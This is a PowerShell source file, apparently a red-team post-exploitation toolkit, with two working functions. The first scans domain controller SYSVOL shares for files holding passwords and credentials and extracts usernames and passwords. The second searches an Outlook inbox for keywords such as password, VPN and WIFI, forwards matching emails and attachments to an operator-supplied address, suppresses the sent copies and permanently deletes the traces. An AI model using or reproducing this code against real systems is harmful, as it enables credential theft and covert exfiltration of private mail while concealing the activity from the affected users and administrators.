# LaresLLC PSScrapingKit 2023
# Neil Lines & Andy Gill
# v1.01 Release
# Combining DCScrape and Outlook Scrape into one toolkit
#
# Usage
# Search DCs with default settings
# Invoke-SearchDCs
#
# Search DCs specifying a custom domain
# Invoke-SearchDCs -domain "my.custom.domain"
#
# Search DCs specifying custom initial keywords, a custom domain, and listing only filenames
# Invoke-SearchDCs -initialKeywords @('keyword1', 'keyword2') -domain "my.custom.domain" -onlyFileName $true
#
# Search Outlook
# Invoke-OutlookScrape

function Invoke-SearchDCs {
    param (
        [string]$domain = $env:USERDNSDOMAIN,
        [string[]]$initialKeywords = @(
            'password', 'cpassword', 'passw', 'cred',
            'Password', 'Cpassword', 'Passw', 'Cred',
            'Password:', 'password:', 'Password=',
            'password=', 'password ', 'cpassword ',
            'passw ', 'cred ', 'Password ', 'Cpassword ',
            'Passw ', 'Cred ', 'Password: ', 'password: ',
            'Password= ', 'password= ', 'Password : ',
            'password : ', 'Password = ', 'password = '
        ),
        [string[]]$additionalKeywords = @(
            'user', 'username', 'name', 'User',
            'Username', 'Name', 'Username:', 'username:',
            'Username=', 'username=', 'user ', 'username ',
            'name ', 'User ', 'Username ', 'Name ',
            'Username: ', 'username: ', 'Username= ',
            'username= ', 'Username : ', 'username : ',
            'Username = ', 'username = '
        ),
        [switch]$onlyFileName = $false
    )
    $domainController = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object -First 1
    $netlogonPath = "\\$($domainController.Name)\SYSVOL\$domain"
    $matchesFound = $false

    Get-ChildItem -Path $netlogonPath -Recurse -File | Where-Object { $_.Name -notin @('GptTmpl.inf', 'GPT.INI', 'Registry.pol') } | ForEach-Object {
        $content = Get-Content $_.FullName

        foreach ($line in $content) {
            $matches = $initialKeywords | Where-Object { $line -cmatch $_ }

            if ($matches) {
                $matchesFound = $true
                if ($onlyFileName) {
                    Write-Host $_.Name
                    continue
                }
                Write-Host "Match found in file $($_.FullName)!"

                $contextStart = [Math]::Max(0, [Array]::IndexOf($content, $line) - 3)
                $contextEnd = [Math]::Min([Array]::IndexOf($content, $line) + 3, $content.Count - 1)
                $context = $content[$contextStart..$contextEnd]

                $additionalKeywordsFound = $additionalKeywords | Where-Object { $context -like "*$_*" }

                $username = $line | Select-String -Pattern '(?i)username\s*[:=]\s*(.+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
                if ([string]::IsNullOrEmpty($username)) {
                    $username = $context -join ' '
                }

                $password = $line | Select-String -Pattern '(?i)(?:password|passw|cred)\s*[=:]\s*(\S+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
                if ([string]::IsNullOrEmpty($password)) {
                    $password = $content | Select-String -Pattern '(?i)(?:password|passw|cred)\s*[=:]\s*(\S+)' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
                }
                if ([string]::IsNullOrEmpty($password)) {
                    $password = $line
                }

                [PSCustomObject]@{
                    FileName = $_.Name
                    FullName = $_.FullName
                    PrecedingContext = $context[0..($context.IndexOf($line) - 1)]
                    MatchingLine = $line
                    TrailingContext = $context[($context.IndexOf($line) + 1)..($context.Count - 1)]
                    AdditionalKeywordsFound = $additionalKeywordsFound
                    Username = $username
                    Password = $password
                }
            }
        }
    }

    if (-not $matchesFound) {
        Write-Host "No matches found."
    }
}

function Invoke-OutlookScrape {
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $folders = $namespace.Folders
    $inboxFolderName = "Inbox"
    $sentItemsFolderName = "Sent Items"
    $deletedItemsFolderName = "Deleted Items"
    $inboxFolderIndex = $null
    $sentItemsFolderIndex = $null
    $deletedItemsFolderIndex = $null

    $folders | ForEach-Object {
        $folder = $_
        $subFolders = $folder.Folders
        $subFolders | ForEach-Object {
            $subFolder = $_
            if ($subFolder.Name -eq $inboxFolderName) {
                $inboxFolderIndex = $subFolder.EntryID
            }
            if ($subFolder.Name -eq $sentItemsFolderName) {
                $sentItemsFolderIndex = $subFolder.EntryID
            }
            if ($subFolder.Name -eq $deletedItemsFolderName) {
                $deletedItemsFolderIndex = $subFolder.EntryID
            }
        }
    }

    if ($inboxFolderIndex -and $sentItemsFolderIndex -and $deletedItemsFolderIndex) {
        $inbox = $namespace.GetFolderFromID($inboxFolderIndex)
        $sentItems = $namespace.GetFolderFromID($sentItemsFolderIndex)
        $deletedItems = $namespace.GetFolderFromID($deletedItemsFolderIndex)

        $validKeywordOptions = "1", "2"

        # Prompt for keyword selection
        $keywordOption = ""
        while ($keywordOption -notin $validKeywordOptions) {
            Write-Host "Select keyword option:"
            Write-Host "1. User-defined keywords"
            Write-Host "2. Default keywords (password, security, confidential, VPN, WIFI)"
            $keywordOption = Read-Host "Enter the keyword option"
        }

        $keywords = @()

        if ($keywordOption -eq "1") {
            # Prompt for user-defined keywords
            Write-Host "Enter keywords (one per line). Press Enter on an empty line to finish."
            while ($true) {
                $keywordInput = Read-Host "Enter a keyword"
                if ([string]::IsNullOrWhiteSpace($keywordInput)) {
                    break
                }
                $keywords += $keywordInput
            }
        }
        elseif ($keywordOption -eq "2") {
            # Default keywords
            $keywords = "password", "security", "confidential", "VPN", "WIFI"
        }

        # Prompt for destination email address
        $forwardToEmail = Read-Host "Enter the destination email address for forwarding"

        $items = $inbox.Items
        $items | ForEach-Object {
            $email = $_
            $foundKeywords = $keywords | Where-Object { $email.Subject -like "*$_*" -or $email.Body -like "*$_*" }
        
            if ($foundKeywords) {
                $subject = $email.Subject
                $sender = $email.SenderEmailAddress
                $recipients = $email.To | ForEach-Object { $_.Address }
                $body = $email.Body
            
                $forwardEmail = $outlook.CreateItem(0)
                $forwardEmail.Subject = "Matching Email Information: $subject"
                $forwardEmail.Body = "Sender: $sender`nRecipients: $recipients`n`n$body"
                $forwardEmail.To = $forwardToEmail
                $forwardEmail.DeleteAfterSubmit = $true
            
                $email.Attachments | ForEach-Object {
                    $attachment = $_
                    $tempPath = Join-Path -Path $env:TEMP -ChildPath $attachment.FileName
                    $attachment.SaveAsFile($tempPath)
                    $forwardEmail.Attachments.Add($tempPath)
                }
            
                $forwardEmail.Send()
            
                if ($forwardEmail.Attachments) {
                    $forwardEmail.Attachments | ForEach-Object { $_.Delete() }
                }
            
                Write-Host "Matching email found. Forwarded the email information to $forwardToEmail"
                Start-Sleep -Seconds 5
            
                $matchingItemsDeleted = $deletedItems.Items | Where-Object { $_.Subject -eq $subject }
                $matchingItemsDeleted | ForEach-Object { $_.Delete() }
                Write-Host "Matching emails permanently deleted from the Deleted Items folder"
            }
        }
    }
}
